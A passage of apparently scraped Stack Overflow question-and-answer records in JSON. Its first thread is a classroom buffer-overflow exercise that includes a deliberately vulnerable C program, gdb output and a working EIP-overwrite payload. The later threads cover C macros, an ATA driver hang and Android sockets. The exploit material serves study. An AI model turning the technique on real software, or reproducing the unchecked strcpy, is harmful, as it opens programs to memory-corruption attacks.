false, "score": 0, "creation_date": 1459327066, "post_id": 36302917, "comment_id": 60231123, "body": "Please add a note which architecture we&#39;re talking about here. I assume x86?"}, {"owner": {"reputation": 3176, "user_id": 335427, "user_type": "registered", "accept_rate": 74, "profile_image": "https://www.gravatar.com/avatar/107ac6beacf71f2a5d4165d5bdc2cedb?s=128&d=identicon&r=PG", "display_name": "Chris", "link": "https://stackoverflow.com/users/335427/chris"}, "reply_to_user": {"reputation": 15165, "user_id": 1116364, "user_type": "registered", "accept_rate": 62, "profile_image": "https://www.gravatar.com/avatar/b67dfca0caba03083330d39a304b1766?s=128&d=identicon&r=PG", "display_name": "Daniel Jour", "link": "https://stackoverflow.com/users/1116364/daniel-jour"}, "edited": false, "score": 0, "creation_date": 1459327146, "post_id": 36302917, "comment_id": 60231171, "body": "Ah sorry yes it is i686"}, {"owner": {"reputation": 15165, "user_id": 1116364, "user_type": "registered", "accept_rate": 62, "profile_image": "https://www.gravatar.com/avatar/b67dfca0caba03083330d39a304b1766?s=128&d=identicon&r=PG", "display_name": "Daniel Jour", "link": "https://stackoverflow.com/users/1116364/daniel-jour"}, "edited": false, "score": 0, "creation_date": 1459333954, "post_id": 36302917, "comment_id": 60236068, "body": "It&#39;s tricky .. I&#39;m trying to keep ebp intact in order to not corrupt the stack, but cannot figure out atm how to get to the ebp pushed by main such that the initialization code that called it doesn&#39;t segfault."}, {"owner": {"reputation": 33092, "user_id": 5801661, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/D8ENZ.jpg?s=128&g=1", "display_name": "Margaret Bloom", "link": "https://stackoverflow.com/users/5801661/margaret-bloom"}, "edited": false, "score": 0, "creation_date": 1459336418, "post_id": 36302917, "comment_id": 60237810, "body": "If you know: 1) the address of the target function 2) the return address to go to 3) the address of the <code>buffer</code> var 4) that the stack is executable <i>then</i> you can use  an executable payload. For example <a href=\"http://pastebin.com/AAACcu1U\" rel=\"nofollow noreferrer\">this</a> (<b>not tested at all</b>)"}, {"owner": {"reputation": 3176, "user_id": 335427, "user_type": "registered", "accept_rate": 74, "profile_image": "https://www.gravatar.com/avatar/107ac6beacf71f2a5d4165d5bdc2cedb?s=128&d=identicon&r=PG", "display_name": "Chris", "link": "https://stackoverflow.com/users/335427/chris"}, "edited": false, "score": 0, "creation_date": 1459350663, "post_id": 36302917, "comment_id": 60248999, "body": "Hi Margaret. I did not manage to execute it. @ Daniel as far as I know the sequence should be Return address (in main) | address of function target | saved EBP of main. But what ever I try I can not get that structure in place."}], "answers": [{"tags": [], "owner": {"reputation": 819, "user_id": 6086833, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/060138486ddeff3186d29262a5852c76?s=128&d=identicon&r=PG&f=1", "display_name": "T Johnson", "link": "https://stackoverflow.com/users/6086833/t-johnson"}, "is_accepted": false, "score": 3, "last_activity_date": 1528024162, "last_edit_date": 1528024162, "creation_date": 1459557173, "answer_id": 36367864, "question_id": 36302917, "link": "https://stackoverflow.com/questions/36302917/exploit-a-buffer-overflow/36367864#36367864", "title": "Exploit a buffer overflow", "body": "<p>You need enough data to fill the reserved memory for the stack where 'buffer' is located, then more to overwrite the stack frame pointer, then overwrite the return address with the address of <code>target()</code> and then one more address within <code>target()</code> but not at the very beginning of the function - enter it so the old stack frame pointer is not pushed on the stack. That will cause you to run target instead of returning properly from <code>vulnerable()</code> and then run <code>target()</code> again so you return from <code>target()</code> to <code>main()</code> and so exit without a segmentation fault. </p>\n\n<p>When we enter vulnerable() for the first time and are about to put data\ninto the 'buffer' variable the stack looks like this:</p>\n\n<pre><code>-----------\n|  24-bytes of local storage - 'buffer' lives here \n-----------\n|  old stack frame pointer (from main) &lt;-- EBP points here\n-----------\n|  old EIP (address in main)\n-----------\n|  'input' argument for 'vulnerable'\n-----------\n|  top of stack for main\n-----------\n|  ... more stack here ...\n</code></pre>\n\n<p>So starting at the address of 'buffer' we need to put in 24-bytes of junk to\nget past the local storage reserved on the stack, then 4-more bytes to get\npast the old stack frame pointer stored on the stack, then we are at the\nlocation where the old EIP is stored. That's the instruction pointer that the CPU follows blindly. We like him. He's going to help us crush this program. We overwrite the value of the old EIP in the stack which currently points to an address in main() with the start address of target() which is found via the gdb\ndisassemble command:</p>\n\n<pre><code>(gdb) disas target\nDump of assembler code for function target:\n   0x08048424 &lt;+0&gt;:     push   %ebp\n   0x08048425 &lt;+1&gt;:     mov    %esp,%ebp\n   0x08048427 &lt;+3&gt;:     sub    $0x18,%esp\n   0x0804842a &lt;+6&gt;:     movl   $0x8048554,(%esp)\n   0x08048431 &lt;+13&gt;:    call   0x8048354 &lt;puts@plt&gt;\n   0x08048436 &lt;+18&gt;:    leave\n   0x08048437 &lt;+19&gt;:    ret\nEnd of assembler dump.\n</code></pre>\n\n<p>The address of the target() function is 0x08048424. Since the (my system at least) system is little endian we enter those values with the LSB first so x24, x84, x04, and x08.</p>\n\n<p>But that leaves us with a problem because as vulnerable() returns it pops all\nthe junk that we put in the stack off the stack and we are left with a stack\nthat looks like this when we are just about to process in target() for the\nfirst time:</p>\n\n<pre><code>-----------\n|  'input' argument for 'vulnerable'\n-----------\n|  top of stack for main\n-----------\n| ... more stack here ...\n</code></pre>\n\n<p>So when target() wants to return it will not find the return address on the\ntop of its stack as expected and so will have a segmentation fault.</p>\n\n<p>So we want to force a new return value onto the top of the stack before we\nstart processing in target(). But what value to choose? We don't want to push\nthe EBP because it contains garbage. Remember? We shoved garbage into it when we overwrote 'buffer'. So instead push the target() instruction just after the </p>\n\n<p><code>push %ebp</code> </p>\n\n<p>( in this case address 0x08048425 ).</p>\n\n<p>This means that the stack will look like this when target() is ready to return\nfor the first time:</p>\n\n<pre><code>-----------\n|  address of mov %esp, %ebp instruction in target()\n-----------\n|  top of stack for main\n-----------\n|  ... more stack here ...\n</code></pre>\n\n<p>So upon return from target() the first time , the EIP will now point at the second instruction in target(), which means that the second time we process through target() it has the same stack that main() had when it processed. The top of the stack is the same top of the stack for main(). Now the stack looks like:</p>\n\n<pre><code>-----------\n|  top of stack for main\n-----------\n|  ... more stack here ...\n</code></pre>\n\n<p>So when target() returns the second time it has a good stack to return with\nsince it is using the same stack that main() used and so the program exits normally. </p>\n\n<p>So to sum it up that is 28-bytes followed by the address of the first instruction in target() followed by the address of the second instruction in target().</p>\n\n<pre><code>sys1:/usr2/home&gt; ./buggy AAAAAAAAAABBBBBBBBBBCCCCCCCC$'\\x24\\x84\\x04\\x08'$'\\x25\\x84\\x04\\x08'\ntarget\ntarget\nsys1:/usr2/home&gt;\n</code></pre>\n"}], "owner": {"reputation": 3176, "user_id": 335427, "user_type": "registered", "accept_rate": 74, "profile_image": "https://www.gravatar.com/avatar/107ac6beacf71f2a5d4165d5bdc2cedb?s=128&d=identicon&r=PG", "display_name": "Chris", "link": "https://stackoverflow.com/users/335427/chris"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 1734, "favorite_count": 2, "answer_count": 1, "score": 12, "last_activity_date": 1528024162, "creation_date": 1459324803, "last_edit_date": 1459327371, "question_id": 36302917, "link": "https://stackoverflow.com/questions/36302917/exploit-a-buffer-overflow", "title": "Exploit a buffer overflow", "body": "<p>For my studies I try to create a payload so that it overflows the buffer and calls a \"secret\" function called \"target\"</p>\n\n<p>This is the code I use for testing on an i686</p>\n\n<pre><code>#include \"stdio.h\"\n#include \"string.h\"\nvoid target() {\n  printf(\"target\\n\");\n}\nvoid vulnerable(char* input) {\n  char buffer[16];\n  strcpy(buffer, input);\n}\nint main(int argc, char** argv) {\n  if(argc == 2)\n    vulnerable(argv[1]);\n  else\n    printf(\"Need an argument!\");\n\n  return 0;\n}\n</code></pre>\n\n<p><strong>Task 1</strong>: Create a payload so that target() is being called.\nThis was rather easy to do by replacing the EIP with the address of the target function.</p>\n\n<p>This is how the buffer looks</p>\n\n<pre><code>Buffer\n(gdb) x/8x buffer\n0xbfffef50: 0x41414141 0x41414141 0x00414141 0x08048532\n0xbfffef60: 0x00000002 0xbffff024 0xbfffef88 0x080484ca\n</code></pre>\n\n<p>Payload I used was: </p>\n\n<pre><code>run AAAAAAAAAAAAAAAAAAAAAAAAAAAA$'\\x7d\\x84\\x04\\x08'\n</code></pre>\n\n<p>This works fine but stops with a segmentation fault.</p>\n\n<p><strong>Task 2:</strong> Modify the payload in a way that it does not give a segmentation fault</p>\n\n<p>This is where I am stuck. Obviously it causes a segmentation fault because we do not call target with the call instruction and therefore there is no valid return address. </p>\n\n<p>I tried to add the return address on the stack but that did not help</p>\n\n<pre><code>run AAAAAAAAAAAAAAAAAAAAAAAA$'\\xca\\x84\\x04\\x08'$'\\x7d\\x84\\x04\\x08'\n</code></pre>\n\n<p>Maybe someone can help me out with this. Probably I also have to add the saved EBP of main?</p>\n\n<p>I attach the objdump of the programm</p>\n\n<pre><code>0804847d &lt;target&gt;:\n 804847d:   55                      push   %ebp\n 804847e:   89 e5                   mov    %esp,%ebp\n 8048480:   83 ec 18                sub    $0x18,%esp\n 8048483:   c7 04 24 70 85 04 08    movl   $0x8048570,(%esp)\n 804848a:   e8 c1 fe ff ff          call   8048350 &lt;puts@plt&gt;\n 804848f:   c9                      leave  \n 8048490:   c3                      ret    \n\n08048491 &lt;vulnerable&gt;:\n 8048491:   55                      push   %ebp\n 8048492:   89 e5                   mov    %esp,%ebp\n 8048494:   83 ec 28                sub    $0x28,%esp\n 8048497:   8b 45 08                mov    0x8(%ebp),%eax\n 804849a:   89 44 24 04             mov    %eax,0x4(%esp)\n 804849e:   8d 45 e8                lea    -0x18(%ebp),%eax\n 80484a1:   89 04 24                mov    %eax,(%esp)\n 80484a4:   e8 97 fe ff ff          call   8048340 &lt;strcpy@plt&gt;\n 80484a9:   c9                      leave  \n 80484aa:   c3                      ret    \n\n080484ab &lt;main&gt;:\n 80484ab:   55                      push   %ebp\n 80484ac:   89 e5                   mov    %esp,%ebp\n 80484ae:   83 e4 f0                and    $0xfffffff0,%esp\n 80484b1:   83 ec 10                sub    $0x10,%esp\n 80484b4:   83 7d 08 02             cmpl   $0x2,0x8(%ebp)\n 80484b8:   75 12                   jne    80484cc &lt;main+0x21&gt;\n 80484ba:   8b 45 0c                mov    0xc(%ebp),%eax\n 80484bd:   83 c0 04                add    $0x4,%eax\n 80484c0:   8b 00                   mov    (%eax),%eax\n 80484c2:   89 04 24                mov    %eax,(%esp)\n 80484c5:   e8 c7 ff ff ff          call   8048491 &lt;vulnerable&gt;\n 80484ca:   eb 0c                   jmp    80484d8 &lt;main+0x2d&gt;\n 80484cc:   c7 04 24 77 85 04 08    movl   $0x8048577,(%esp)\n 80484d3:   e8 58 fe ff ff          call   8048330 &lt;printf@plt&gt;\n 80484d8:   b8 00 00 00 00          mov    $0x0,%eax\n 80484dd:   c9                      leave  \n 80484de:   c3                      ret    \n 80484df:   90                      nop\n</code></pre>\n"}, {"tags": ["c"], "comments": [{"owner": {"reputation": 17586, "user_id": 3482140, "user_type": "registered", "accept_rate": 83, "profile_image": "https://i.stack.imgur.com/lSFth.jpg?s=128&g=1", "display_name": "Am_I_Helpful", "link": "https://stackoverflow.com/users/3482140/am-i-helpful"}, "edited": false, "score": 0, "creation_date": 1459324590, "post_id": 36302746, "comment_id": 60229689, "body": "Can&#39;t you achieve the same using IDE&#39;s find &amp; replace? Just suggesting, though I understand the cons."}, {"owner": {"reputation": 14429, "user_id": 3494013, "user_type": "registered", "accept_rate": 95, "profile_image": "https://www.gravatar.com/avatar/ff6b6de2f59471e271413f74921e054a?s=128&d=identicon&r=PG&f=1", "display_name": "cadaniluk", "link": "https://stackoverflow.com/users/3494013/cadaniluk"}, "reply_to_user": {"reputation": 17586, "user_id": 3482140, "user_type": "registered", "accept_rate": 83, "profile_image": "https://i.stack.imgur.com/lSFth.jpg?s=128&g=1", "display_name": "Am_I_Helpful", "link": "https://stackoverflow.com/users/3482140/am-i-helpful"}, "edited": false, "score": 1, "creation_date": 1459324636, "post_id": 36302746, "comment_id": 60229718, "body": "@Am_I_Helpful I&#39;d never rely on my IDE. Some people don&#39;t use one as well."}], "answers": [{"tags": [], "owner": {"reputation": 361156, "user_id": 440558, "user_type": "registered", "accept_rate": 75, "profile_image": "https://i.stack.imgur.com/9ZYta.jpg?s=128&g=1", "display_name": "Some programmer dude", "link": "https://stackoverflow.com/users/440558/some-programmer-dude"}, "is_accepted": true, "score": 7, "last_activity_date": 1459324620, "creation_date": 1459324620, "answer_id": 36302867, "question_id": 36302746, "link": "https://stackoverflow.com/questions/36302746/add-namespace-string-to-all-functions/36302867#36302867", "title": "add namespace string to all functions", "body": "<p>You can do it with the macro concatenation operator and function-like macros:</p>\n\n<pre><code>#define NAMESPACE(name) project_name_ ## name\n\nvoid NAMESPACE(func_name)(void)\n{\n    ...\n}\n</code></pre>\n"}, {"tags": [], "owner": {"reputation": 6899, "user_id": 1212012, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/gmBY7.png?s=128&g=1", "display_name": "Mathieu", "link": "https://stackoverflow.com/users/1212012/mathieu"}, "is_accepted": false, "score": 2, "last_activity_date": 1459324702, "creation_date": 1459324702, "answer_id": 36302883, "question_id": 36302746, "link": "https://stackoverflow.com/questions/36302746/add-namespace-string-to-all-functions/36302883#36302883", "title": "add namespace string to all functions", "body": "<p>You can do that with the macro <a href=\"https://gcc.gnu.org/onlinedocs/cpp/Concatenation.html\" rel=\"nofollow\">concatenation</a></p>\n\n<pre><code>#define NAMESPACE(function) project_name ## function\n\nvoid NAMESPACE(func_name)()\n{\n}\n</code></pre>\n"}], "owner": {"reputation": 1405, "user_id": 646710, "user_type": "registered", "accept_rate": 50, "profile_image": "https://www.gravatar.com/avatar/ad96b8b96de851fe2308338910a2f31e?s=128&d=identicon&r=PG", "display_name": "Sumit", "link": "https://stackoverflow.com/users/646710/sumit"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 63, "favorite_count": 0, "accepted_answer_id": 36302867, "answer_count": 2, "score": 4, "last_activity_date": 1459333282, "creation_date": 1459324243, "last_edit_date": 1459333282, "question_id": 36302746, "link": "https://stackoverflow.com/questions/36302746/add-namespace-string-to-all-functions", "title": "add namespace string to all functions", "body": "<p>In C, I want to add a namespace prefix string(without quotes) to all functions for which I want it to happen, and later on change the namespace string any time easily.</p>\n\n<p>My approach:</p>\n\n<pre><code>#define NAMESPACE project_name\n\nvoid NAMESPACE_func_name()\n{\n}\n\nThat should become:\n\nvoid project_name_func_name()\n{\n}\n</code></pre>\n\n<p>Is that possible, how?\nThanks for help in advance.</p>\n"}, {"tags": ["c", "operating-system", "systems-programming", "ata"], "comments": [{"owner": {"reputation": 14429, "user_id": 3494013, "user_type": "registered", "accept_rate": 95, "profile_image": "https://www.gravatar.com/avatar/ff6b6de2f59471e271413f74921e054a?s=128&d=identicon&r=PG&f=1", "display_name": "cadaniluk", "link": "https://stackoverflow.com/users/3494013/cadaniluk"}, "edited": false, "score": 0, "creation_date": 1459324547, "post_id": 36302711, "comment_id": 60229657, "body": "Have you checked if any exceptions are raised? You&#39;re on x86, right?"}, {"owner": {"reputation": 137, "user_id": 4983155, "user_type": "registered", "accept_rate": 56, "profile_image": "https://lh6.googleusercontent.com/-Jn4zByOMdjc/AAAAAAAAAAI/AAAAAAAAB2Q/ra2ySY0yfHU/photo.jpg?sz=128", "display_name": "Ahmed F. Mostafa", "link": "https://stackoverflow.com/users/4983155/ahmed-f-mostafa"}, "reply_to_user": {"reputation": 14429, "user_id": 3494013, "user_type": "registered", "accept_rate": 95, "profile_image": "https://www.gravatar.com/avatar/ff6b6de2f59471e271413f74921e054a?s=128&d=identicon&r=PG&f=1", "display_name": "cadaniluk", "link": "https://stackoverflow.com/users/3494013/cadaniluk"}, "edited": false, "score": 0, "creation_date": 1459324736, "post_id": 36302711, "comment_id": 60229776, "body": "yep, ia m in x86 protected mode , and yes if exception is raised my panic will catch."}], "owner": {"reputation": 137, "user_id": 4983155, "user_type": "registered", "accept_rate": 56, "profile_image": "https://lh6.googleusercontent.com/-Jn4zByOMdjc/AAAAAAAAAAI/AAAAAAAAB2Q/ra2ySY0yfHU/photo.jpg?sz=128", "display_name": "Ahmed F. Mostafa", "link": "https://stackoverflow.com/users/4983155/ahmed-f-mostafa"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 275, "favorite_count": 0, "answer_count": 0, "score": 2, "last_activity_date": 1459324500, "creation_date": 1459324157, "last_edit_date": 1459324500, "question_id": 36302711, "link": "https://stackoverflow.com/questions/36302711/ata-ide-identify", "title": "ATA IDE IDENTIFY", "body": "<p>I am trying to develop ide ata driver for my os learning .. i am facing a problem that after sending IDENTIFY CMD the system hang up with no panic ..!\ni am using the below code </p>\n\n<pre><code>/* ATA specs say these values must be zero before sending IDENTIFY */\noutportb(io + ATA_REG_SECCOUNT0, 0);\noutportb(io + ATA_REG_LBA0, 0);\noutportb(io + ATA_REG_LBA1, 0);\noutportb(io + ATA_REG_LBA2, 0);\n/* Now, send IDENTIFY */\nPrintf(\"Sending IDENTIFY to port 0x%X\\n\",io);\noutportb(io + ATA_REG_COMMAND, ATA_CMD_IDENTIFY);\nPrintf(\"Sent IDENTIFY\\n\");\n/* Now, read status port */\nuint8_t status = inportb(io + ATA_REG_STATUS);\nPrintf(\"\\nThe status right now is %d\", status);\nif (status)\n{\n    Printf(\"\\nNow Polling... _IRQP = %d , _IRQS= %d\",_IRQP,_IRQS);\n    /* Now, poll untill BSY is clear. */\n    //while (inportb(io + ATA_REG_STATUS) &amp; ATA_SR_BSY != 0);\n    while (!_IRQP || !_IRQS){}\n    Printf(\"\\nFinished Polling... _IRQP = %d , _IRQS= %d\", _IRQP, _IRQS);\n</code></pre>\n\n<p>it never reach \"Sent Identify\" .. and some thime it writes Sen and hang.</p>\n\n<p>i have tested on Virtualbox and VMWare as well and the same result.\nany idea why it is hanging up?</p>\n"}, {"tags": ["android", "c", "sockets"], "comments": [{"owner": {"reputation": 10896, "user_id": 453851, "user_type": "registered", "accept_rate": 70, "profile_image": "https://www.gravatar.com/avatar/f72d9b8fe02cc534906f89eb22d74cb0?s=128&d=identicon&r=PG", "display_name": "Philip Couling", "link": "https://stackoverflow.com/users/453851/philip-couling"}, "edited": false, "score": 0, "creation_date": 1459324648, "post_id": 36302654, "comment_id": 60229725, "body": "You have a typo in your question making it unclear what works and what doesn&#39;t.  This shouldn&#39;t work in either direction because you are networking on the main thread in android."}, {"owner": {"reputation": 58995, "user_id": 1322972, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/puZFr.png?s=128&g=1", "display_name": "WhozCraig", "link": "https://stackoverflow.com/users/1322972/whozcraig"}, "edited": false, "score": 0, "creation_date": 1459324800, "post_id": 36302654, "comment_id": 60229819, "body": "So we have an android java client, and a C++ server, naturally we&#39;ll tag this with C (facepalm). Ironically, it does appear to be C code, so where the C++ comes in is the mystery. Btw, what is the purpose for the stand-alone <code>gul[200];</code> in your <code>main()</code> ?"}, {"owner": {"reputation": 1, "user_id": 6132889, "user_type": "registered", "profile_image": "https://lh4.googleusercontent.com/-VJmvO5FXIQI/AAAAAAAAAAI/AAAAAAAAAE4/mfMBurE_NmI/photo.jpg?sz=128", "display_name": "Ragul Bhagwanth", "link": "https://stackoverflow.com/users/6132889/ragul-bhagwanth"}, "edited": false, "score": 0, "creation_date": 1459327252, "post_id": 36302654, "comment_id": 60231240, "body": "ya ..my mistake...its a c server not c++ and have edited the code ...it does not have gul[200]. This code is able to connect with the c server and send a string. But the android client is not receiving the response which in this case is given by the variable &quot;g&quot;."}, {"owner": {"reputation": 10749, "user_id": 2108972, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/38a04d0ccf9b761c9373ec9905ca7e92?s=128&d=identicon&r=PG", "display_name": "greenapps", "link": "https://stackoverflow.com/users/2108972/greenapps"}, "edited": false, "score": 0, "creation_date": 1459330548, "post_id": 36302654, "comment_id": 60233534, "body": "<code>I am able to send the string to the android client from C server.</code>. Well if the server can send it to then the client receives it. Then what is the problem? Can you describe your scenario better please?"}, {"owner": {"reputation": 1, "user_id": 6132889, "user_type": "registered", "profile_image": "https://lh4.googleusercontent.com/-VJmvO5FXIQI/AAAAAAAAAAI/AAAAAAAAAE4/mfMBurE_NmI/photo.jpg?sz=128", "display_name": "Ragul Bhagwanth", "link": "https://stackoverflow.com/users/6132889/ragul-bhagwanth"}, "reply_to_user": {"reputation": 10749, "user_id": 2108972, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/38a04d0ccf9b761c9373ec9905ca7e92?s=128&d=identicon&r=PG", "display_name": "greenapps", "link": "https://stackoverflow.com/users/2108972/greenapps"}, "edited": false, "score": 0, "creation_date": 1459331784, "post_id": 36302654, "comment_id": 60234482, "body": "@greenapps ...sry typing mistake. I am able to send the string from android client to the c server. But i am not getting the response from the c server to the android client."}, {"owner": {"reputation": 10749, "user_id": 2108972, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/38a04d0ccf9b761c9373ec9905ca7e92?s=128&d=identicon&r=PG", "display_name": "greenapps", "link": "https://stackoverflow.com/users/2108972/greenapps"}, "edited": false, "score": 0, "creation_date": 1459332032, "post_id": 36302654, "comment_id": 60234682, "body": "We cannot see what you send. Do away with that input gets and supply an example with an inbuild string."}, {"owner": {"reputation": 288867, "user_id": 207421, "user_type": "registered", "accept_rate": 82, "profile_image": "https://www.gravatar.com/avatar/5cfe5f7d64f44be04f147295f5c7b88e?s=128&d=identicon&r=PG", "display_name": "user207421", "link": "https://stackoverflow.com/users/207421/user207421"}, "edited": false, "score": 0, "creation_date": 1459337986, "post_id": 36302654, "comment_id": 60238932, "body": "Your code is lametably free of error checking. It isn&#39;t sufficient to just check some of the system calls. You have to check them all: <code>socket(), bind(), listen(), bind(), read(), write(), ...</code> And you also have to check <code>read()</code> for end of stream, and make use of the count returned if it&#39;s positive, rather than assuming the read filled the buffer."}, {"owner": {"reputation": 10749, "user_id": 2108972, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/38a04d0ccf9b761c9373ec9905ca7e92?s=128&d=identicon&r=PG", "display_name": "greenapps", "link": "https://stackoverflow.com/users/2108972/greenapps"}, "edited": false, "score": 0, "creation_date": 1459338777, "post_id": 36302654, "comment_id": 60239475, "body": "<code>I am able to send the string to the C server from the android client.</code>. How do you know? Please tell what you see."}, {"owner": {"reputation": 1, "user_id": 6132889, "user_type": "registered", "profile_image": "https://lh4.googleusercontent.com/-VJmvO5FXIQI/AAAAAAAAAAI/AAAAAAAAAE4/mfMBurE_NmI/photo.jpg?sz=128", "display_name": "Ragul Bhagwanth", "link": "https://stackoverflow.com/users/6132889/ragul-bhagwanth"}, "reply_to_user": {"reputation": 10749, "user_id": 2108972, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/38a04d0ccf9b761c9373ec9905ca7e92?s=128&d=identicon&r=PG", "display_name": "greenapps", "link": "https://stackoverflow.com/users/2108972/greenapps"}, "edited": false, "score": 0, "creation_date": 1459343120, "post_id": 36302654, "comment_id": 60242712, "body": "@greenapps ...Whatever I type in the EditText filed. I am able to receive it in the C server side. But the client is not getting any response back."}, {"owner": {"reputation": 10749, "user_id": 2108972, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/38a04d0ccf9b761c9373ec9905ca7e92?s=128&d=identicon&r=PG", "display_name": "greenapps", "link": "https://stackoverflow.com/users/2108972/greenapps"}, "reply_to_user": {"reputation": 10896, "user_id": 453851, "user_type": "registered", "accept_rate": 70, "profile_image": "https://www.gravatar.com/avatar/f72d9b8fe02cc534906f89eb22d74cb0?s=128&d=identicon&r=PG", "display_name": "Philip Couling", "link": "https://stackoverflow.com/users/453851/philip-couling"}, "edited": false, "score": 0, "creation_date": 1459343460, "post_id": 36302654, "comment_id": 60243003, "body": "That&#39;s what you say. But where do you see it in your server code i asked? Further i do not believe you. As @couling already said: you cannot just send in onClick(). You should use a thread there too to send and receive."}], "answers": [{"comments": [{"owner": {"reputation": 10749, "user_id": 2108972, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/38a04d0ccf9b761c9373ec9905ca7e92?s=128&d=identicon&r=PG", "display_name": "greenapps", "link": "https://stackoverflow.com/users/2108972/greenapps"}, "reply_to_user": {"reputation": 1, "user_id": 6132889, "user_type": "registered", "profile_image": "https://lh4.googleusercontent.com/-VJmvO5FXIQI/AAAAAAAAAAI/AAAAAAAAAE4/mfMBurE_NmI/photo.jpg?sz=128", "display_name": "Ragul Bhagwanth", "link": "https://stackoverflow.com/users/6132889/ragul-bhagwanth"}, "edited": false, "score": 2, "creation_date": 1459333454, "post_id": 36305604, "comment_id": 60235726, "body": "Show your code. And with a predefined string. In your post. Not in comments."}], "tags": [], "owner": {"reputation": 10749, "user_id": 2108972, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/38a04d0ccf9b761c9373ec9905ca7e92?s=128&d=identicon&r=PG", "display_name": "greenapps", "link": "https://stackoverflow.com/users/2108972/greenapps"}, "is_accepted": false, "score": 0, "last_activity_date": 1459332334, "creation_date": 1459332334, "answer_id": 36305604, "question_id": 36302654, "link": "https://stackoverflow.com/questions/36302654/android-client-not-getting-response-from-c-server-socket/36305604#36305604", "title": "android client not getting response from C server socket", "body": "<pre><code> String read = input.readLine();\n</code></pre>\n\n<p>The client tries to read a line. But the server is not sending a line with</p>\n\n<pre><code>n = write(newsockfd, g,p);\n</code></pre>\n\n<p>Add a <code>\"\\n\"</code> to string variable <code>g</code> before sending. And before determining <code>p</code>.</p>\n"}, {"tags": [], "owner": {"reputation": 10896, "user_id": 453851, "user_type": "registered", "accept_rate": 70, "profile_image": "https://www.gravatar.com/avatar/f72d9b8fe02cc534906f89eb22d74cb0?s=128&d=identicon&r=PG", "display_name": "Philip Couling", "link": "https://stackoverflow.com/users/453851/philip-couling"}, "is_accepted": false, "score": 0, "last_activity_date": 1459348922, "last_edit_date": 1459348922, "creation_date": 1459348373, "answer_id": 36311993, "question_id": 36302654, "link": "https://stackoverflow.com/questions/36302654/android-client-not-getting-response-from-c-server-socket/36311993#36311993", "title": "android client not getting response from C server socket", "body": "<p>Firstly this code will only work on very old android devices.  Modern devices do not allow networking on the main thread and you MUST move it into a separate thread.  There are enough tutorials around the web to do this.</p>\n\n<p>It is generally good practice to close down sockets and files etc before simply quitting the program.  I don't believe you will fall foul of caching in the code you've written but it's always a risk so best practice says that unless you're deliberately terminating the program early (<code>exit(1)</code>) you should <code>close(newsockfd)</code>.</p>\n\n<p>The most likely cause of the fault you are seeing is that <code>BufferedReader.readline()</code> expects there to be a line terminator (<code>\\n</code>) at the end of every line and you are not sending one... From memory <code>gets()</code> does not include the line terminator when the user presses \"enter\".</p>\n\n<p>On that assumption you need to do something to send the line terminator.  Either modify your string before sending or send it separately:</p>\n\n<pre><code>n = write(newsockfd, \"\\n\", sizeof(\"\\n\") - 1);\n</code></pre>\n\n<p>Don't forget that you should check the response after every write as well as every read.  Writes can fail as well:</p>\n\n<pre><code>if (n &lt; 0) {\n  perror(\"ERROR writing from socket\");\n  exit(1);\n}\n\n// ...\n\nclose(newsockfd);\n</code></pre>\n\n<hr>\n\n<p>If you've tried all this and its still not working...</p>\n\n<p>Look at the output of both sides make sure they are not printing any errors.  So far our responses to you have been based on the assumption that \"not working\" means that its hanging.  If there is an error listed on either side it would shed a lot more light on what's happening.</p>\n\n<p>If it is simply hanging, then I suggest you construct a simple test client in C.  That way you can show either that it works in C only or doesn't... and therefore you can show whether the C code or android code isn't working.  You will always get more help if you can work out which technology has the problem.</p>\n"}], "owner": {"reputation": 1, "user_id": 6132889, "user_type": "registered", "profile_image": "https://lh4.googleusercontent.com/-VJmvO5FXIQI/AAAAAAAAAAI/AAAAAAAAAE4/mfMBurE_NmI/photo.jpg?sz=128", "display_name": "Ragul Bhagwanth", "link": "https://stackoverflow.com/users/6132889/ragul-bhagwanth"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 405, "favorite_count": 0, "answer_count": 2, "score": 0, "last_activity_date": 1459348922, "creation_date": 1459323989, "last_edit_date": 1459333638, "question_id": 36302654, "link": "https://stackoverflow.com/questions/36302654/android-client-not-getting-response-from-c-server-socket", "title": "android client not getting response from C server socket", "body": "<p>I am able to send the string to the C server from the android client.\nBut I am unable get the response back from the server to the android client.\nThe android client is not getting the data. I want to \"toast\" the response got from the c server.</p>\n\n<p><strong>Server code (c):</strong></p>\n\n<pre><code>#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n\n#include &lt;netdb.h&gt;\n#include &lt;netinet/in.h&gt;\n\n#include &lt;string.h&gt;\n\nint main( int argc, char *argv[] ) {\nint sockfd, newsockfd, portno, clilen;\nchar buffer[256];\nchar g[255];\nchar *message;\nstruct sockaddr_in serv_addr, cli_addr;\nint  n;\nint p;\n\n/* First call to socket() function */\nsockfd = socket(AF_INET, SOCK_STREAM, 0);\n\nif (sockfd &lt; 0) {\n  perror(\"ERROR opening socket\");\n  exit(1);\n}\n\n/* Initialize socket structure */\nbzero((char *) &amp;serv_addr, sizeof(serv_addr));\nportno = 5011;\n\nserv_addr.sin_family = AF_INET;\nserv_addr.sin_addr.s_addr = inet_addr(\"192.168.1.125\");\n//serv_addr.sin_addr.s_addr = INADDR_ANY;\nserv_addr.sin_port = htons(portno);\n\n/* Now bind the host address using bind() call.*/\nif (bind(sockfd, (struct sockaddr *) &amp;serv_addr, sizeof(serv_addr)) &lt; 0) {\n  perror(\"ERROR on binding\");\n  exit(1);\n}\n\n/* Now start listening for the clients, here process will\n  * go in sleep mode and will wait for the incoming connection\n*/\n\nlisten(sockfd,5);\nclilen = sizeof(cli_addr);\n\n/* Accept actual connection from the client 